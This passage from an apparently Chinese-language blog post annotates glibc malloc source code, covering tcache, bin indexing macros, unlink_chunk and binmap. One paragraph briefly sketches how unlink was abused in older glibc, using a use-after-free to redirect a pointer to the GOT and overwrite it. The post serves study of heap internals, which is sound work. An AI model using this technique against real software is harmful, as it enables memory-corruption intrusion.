(e-&gt;next);</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_thread_shutdown (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  tcache_perthread_struct *tcache_tmp = tcache;</span><br><span class="line"></span><br><span class="line">  tcache_shutting_down = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!tcache)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Disable the tcache and prevent it from being reinitialized.  */</span></span><br><span class="line">  tcache = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Free all of the entries and the tcache itself back to the arena</span></span><br><span class="line"><span class="comment">     heap for coalescing.  */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; TCACHE_MAX_BINS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> (tcache_tmp-&gt;entries[i])</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache_tmp-&gt;entries[i];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;tcache_thread_shutdown(): &quot;</span></span><br><span class="line">     <span class="string">&quot;unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache_tmp-&gt;entries[i] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  __libc_free (e);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_free (tcache_tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAYBE_INIT_TCACHE() \</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tcache == <span class="literal">NULL</span>)) \</span><br><span class="line">    tcache_init();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>  <span class="comment">/* !USE_TCACHE */</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAYBE_INIT_TCACHE()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_thread_shutdown (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Nothing to do if there is no thread cache.  */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* !USE_TCACHE  */</span></span></span><br></pre></td></tr></table></figure><p>这些好像有点多，一些函数的实现挪到后面malloc的地方再详细讲吧</p><h5 id="一些bin相关的宏"><a href="#一些bin相关的宏" class="headerlink" title="一些bin相关的宏"></a>一些bin相关的宏</h5><p>接下来是有关bin的宏，先贴一个在源码中对bins的简介。(这里就不翻译了x</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Bins</span></span><br><span class="line"><span class="comment">    An array of bin headers for free chunks. Each bin is doubly</span></span><br><span class="line"><span class="comment">    linked.  The bins are approximately proportionally (log) spaced.</span></span><br><span class="line"><span class="comment">    There are a lot of these bins (128). This may look excessive, but</span></span><br><span class="line"><span class="comment">    works very well in practice.  Most bins hold sizes that are</span></span><br><span class="line"><span class="comment">    unusual as malloc request sizes, but are more usual for fragments</span></span><br><span class="line"><span class="comment">    and consolidated sets of chunks, which is what these bins hold, so</span></span><br><span class="line"><span class="comment">    they can be found quickly.  All procedures maintain the invariant</span></span><br><span class="line"><span class="comment">    that no consolidated chunk physically borders another one, so each</span></span><br><span class="line"><span class="comment">    chunk in a list is known to be preceeded and followed by either</span></span><br><span class="line"><span class="comment">    inuse chunks or the ends of memory.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Chunks in bins are kept in size order, with ties going to the</span></span><br><span class="line"><span class="comment">    approximately least recently used chunk. Ordering isn&#x27;t needed</span></span><br><span class="line"><span class="comment">    for the small bins, which all contain the same-sized chunks, but</span></span><br><span class="line"><span class="comment">    facilitates best-fit allocation for larger chunks. These lists</span></span><br><span class="line"><span class="comment">    are just sequential. Keeping them in order almost never requires</span></span><br><span class="line"><span class="comment">    enough traversal to warrant using fancier ordered data</span></span><br><span class="line"><span class="comment">    structures.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Chunks of the same size are linked with the most</span></span><br><span class="line"><span class="comment">    recently freed at the front, and allocations are taken from the</span></span><br><span class="line"><span class="comment">    back.  This results in LRU (FIFO) allocation order, which tends</span></span><br><span class="line"><span class="comment">    to give each chunk an equal opportunity to be consolidated with</span></span><br><span class="line"><span class="comment">    adjacent freed chunks, resulting in larger free chunks and less</span></span><br><span class="line"><span class="comment">    fragmentation.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    To simplify use in double-linked lists, each bin header acts</span></span><br><span class="line"><span class="comment">    as a malloc_chunk. This avoids special-casing for headers.</span></span><br><span class="line"><span class="comment">    But to conserve space and improve locality, we allocate</span></span><br><span class="line"><span class="comment">    only the fd/bk pointers of bins, and then use repositioning tricks</span></span><br><span class="line"><span class="comment">    to treat these as the fields of a malloc_chunk*.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>一些bins的宏。简单来说我们free的chunk不会马上返还给系统，而是放入bins中，如果之后有一些内存申请请求，而我们的bins中又有合适的chunk，就会根据情况返回。这也是局部性的一种体现。</p><p>当然bins的组织也是五花八门的，有用单链表的，有用双链表的。而且在合适的时机会有合并的操作。我们在这先有个大致轮廓，一般而言我们的bins有如下几种</p><ul><li>Tcache bin</li><li>Fast bin</li><li>Small bin</li><li>Large bin</li><li>Unsorted bin</li></ul><p>其实看名字也大致能知道相应的bins存放着什么样的free chunk</p><p>需要注意的是感觉现在Tcache bin 占了大头，需要好好分析一下</p><p>预知详细如何，后文再见分晓(雾)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*定义了 mbinptr的数据类型*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mbinptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* addressing -- note that bin_at(0) does not exist */</span>(</span><br><span class="line"><span class="comment">/*求某个bin的地址(bin[0]不存在)*/</span></span><br><span class="line">#define bin_at(m, i) \</span><br><span class="line">  (mbinptr) (((<span class="keyword">char</span> *) &amp;((m)-&gt;bins[((i) - <span class="number">1</span>) * <span class="number">2</span>]))      \</span><br><span class="line">             - offsetof (struct malloc_chunk, fd))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* analog of ++bin */</span></span><br><span class="line"><span class="comment">/* 取得下一个bin的地址 */</span></span><br><span class="line">#define next_bin(b)  ((mbinptr) ((<span class="keyword">char</span> *) (b) + (<span class="keyword">sizeof</span> (mchunkptr) &lt;&lt; <span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Reminders about list directionality within bins */</span></span><br><span class="line"><span class="comment">// 获取bin位于链表头的chunk</span></span><br><span class="line">#define first(b)     ((b)-&gt;fd)</span><br><span class="line"><span class="comment">//获取bin位于链表尾的chunk</span></span><br><span class="line">#define last(b)      ((b)-&gt;bk)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Indexing</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Bins for sizes &lt; 512 bytes contain chunks of all the same size, spaced</span></span><br><span class="line"><span class="comment">    8 bytes apart. Larger bins are approximately logarithmically spaced:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    64 bins of size       8</span></span><br><span class="line"><span class="comment">    32 bins of size      64</span></span><br><span class="line"><span class="comment">    16 bins of size     512</span></span><br><span class="line"><span class="comment">     8 bins of size    4096</span></span><br><span class="line"><span class="comment">     4 bins of size   32768</span></span><br><span class="line"><span class="comment">     2 bins of size  262144</span></span><br><span class="line"><span class="comment">     1 bin  of size what&#x27;s left</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    There is actually a little bit of slop in the numbers in bin_index</span></span><br><span class="line"><span class="comment">    for the sake of speed. This makes no difference elsewhere.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The bins top out around 1MB because we expect to service large</span></span><br><span class="line"><span class="comment">    requests via mmap.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Bin 0 does not exist.  Bin 1 is the unordered list; if that would be</span></span><br><span class="line"><span class="comment">    a valid chunk size the small bins are bumped up one.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//bins的总数(其实只有127个，bin[0]不存在)</span></span><br><span class="line">#define NBINS             <span class="number">128</span></span><br><span class="line"><span class="comment">//small bins的总数</span></span><br><span class="line">#define NSMALLBINS         <span class="number">64</span></span><br><span class="line">#define SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span><br><span class="line">#define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; CHUNK_HDR_SZ)</span><br><span class="line"><span class="comment">//最小的应归为large bin的free chunk的size</span></span><br><span class="line">#define MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断free chunk的size是否属于smallbin</span></span><br><span class="line">#define in_smallbin_range(sz)  \</span><br><span class="line">  ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) MIN_LARGE_SIZE)</span><br><span class="line"><span class="comment">//判断某个size的free chunk所对应的放入small bin的序号</span></span><br><span class="line">#define smallbin_index(sz) \</span><br><span class="line">  ((SMALLBIN_WIDTH == <span class="number">16</span> ? (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">4</span>) : (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">3</span>))\</span><br><span class="line">   + SMALLBIN_CORRECTION)</span><br><span class="line"><span class="comment">//同smallbin_index，针对不同字长与结构的细分</span></span><br><span class="line">#define largebin_index_32(sz)                                                \</span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">38</span>) ?  <span class="number">56</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :\</span><br><span class="line">   <span class="number">126</span>)</span><br><span class="line"><span class="comment">//和上面那个差不多</span></span><br><span class="line">#define largebin_index_32_big(sz)                                            \</span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">45</span>) ?  <span class="number">49</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :\</span><br><span class="line">   <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// XXX It remains to be seen whether it is good to keep the widths of</span></span><br><span class="line"><span class="comment">// XXX the buckets the same or whether it should be scaled by a factor</span></span><br><span class="line"><span class="comment">// XXX of two as well.</span></span><br><span class="line"><span class="comment">//和上面那个差不多</span></span><br><span class="line">#define largebin_index_64(sz)                                                \</span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">48</span>) ?  <span class="number">48</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :\</span><br><span class="line">   <span class="number">126</span>)</span><br><span class="line"><span class="comment">//根据SIZE_SZ定义的大小与MALLOC_ALIGNMENT大小选择相应的largebin_index进行调用。选择合适的过程，根据size返回对应bins的序号</span></span><br><span class="line">#define largebin_index(sz) \</span><br><span class="line">  (SIZE_SZ == <span class="number">8</span> ? largebin_index_64 (sz)                                     \</span><br><span class="line">   : MALLOC_ALIGNMENT == <span class="number">16</span> ? largebin_index_32_big (sz)                     \</span><br><span class="line">   : largebin_index_32 (sz))</span><br><span class="line"></span><br><span class="line"><span class="comment">//根据size求得在bin中的序号</span></span><br><span class="line">#define bin_index(sz) \</span><br><span class="line">  ((in_smallbin_range (sz)) ? smallbin_index (sz) : largebin_index (sz))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先来总结一下。一个bins数组有128个元素，对应了不同类型的bin。bins数组的元素复用了malloc_chunk的fd与bk，并通过这两个字段来实现对bin中的chunk的索引</p><ul><li>bins[0]不存在</li><li>bins[1]是unsorted bin</li><li>bins[2]-bins[63]是small bin</li><li>剩下的是large bin</li></ul><p>ptmalloc将<code>unsorted bin</code>、<code>small bin</code>以及<code>large bin</code>放在一个bins数组中以管理。而<code>fastbin</code>和<code>tcache bin</code>有另外的字段进行管理。</p><h5 id="unlink操作"><a href="#unlink操作" class="headerlink" title="unlink操作"></a>unlink操作</h5><p>接下来是一个比较重要的操作:<code>unlink_chunk</code></p><p>这个<code>unlink_chunk</code>值得单独拿出来分析一下。这个是个常用的操作，简单来说就是把本来链在某个bins里面的chunk给取出来，一般在某个bins中有我们想要的大小合适的chunk的时候调用它把这个chunk从bins中取出来。在<code>malloc_consolidate</code>中常常调用它进行chunk的前向与后向合并。这个在早期的glibc中是个常见的利用方式，如果存在UAF的话很容易把bss上面的地址进行更改，然后修改原本存堆地址的地方为got表地址(如果能泄露libc的话)，进而覆写。</p><p>这个unlink在之前的博客中分析过，但是为了内容的完整性可以再分析一下(而且我已经好久没看大概已经忘了，大部分时候都是利用的时候现学X)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">unlink_chunk (mstate av, mchunkptr p)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(unlink 分析)</p><h5 id="Binmap相关的宏"><a href="#Binmap相关的宏" class="headerlink" title="Binmap相关的宏"></a>Binmap相关的宏</h5><p>Binmap是为了表示哪个bin有free的chunk而被设计出来的(如果嗯遍历bins和FastbinY之类的非常耗时)。主要是以类似比特向量的形式,如果哪个bin中有chunk，相应的比特位就被置位</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Binmap</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    To help compensate for the large number of bins, a one-level index</span></span><br><span class="line"><span class="comment">    structure is used for bin-by-bin searching.  `binmap&#x27; is a</span></span><br><span class="line"><span class="comment">    bitvector recording whether bins are definitely empty so they can</span></span><br><span class="line"><span class="comment">    be skipped over during during traversals.  The bits are NOT always</span></span><br><span class="line"><span class="comment">    cleared as soon as bins are empty, but instead only</span></span><br><span class="line"><span class="comment">    when they are noticed to be empty during traversal in malloc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conservatively use 32 bits per map word, even if on 64bit system */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINMAPSHIFT      5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BITSPERMAP       (1U &lt;&lt; BINMAPSHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINMAPSIZE       (NBINS / BITSPERMAP)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> idx2block(i)     ((i) &gt;&gt; BINMAPSHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> idx2bit(i)       ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unmark_bin(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp;= ~(idx2bit (i)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> get_binmap(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp; idx2bit (i))</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Fastbins相关宏"><a href="#Fastbins相关宏" class="headerlink" title="Fastbins相关宏"></a>Fastbins相关宏</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 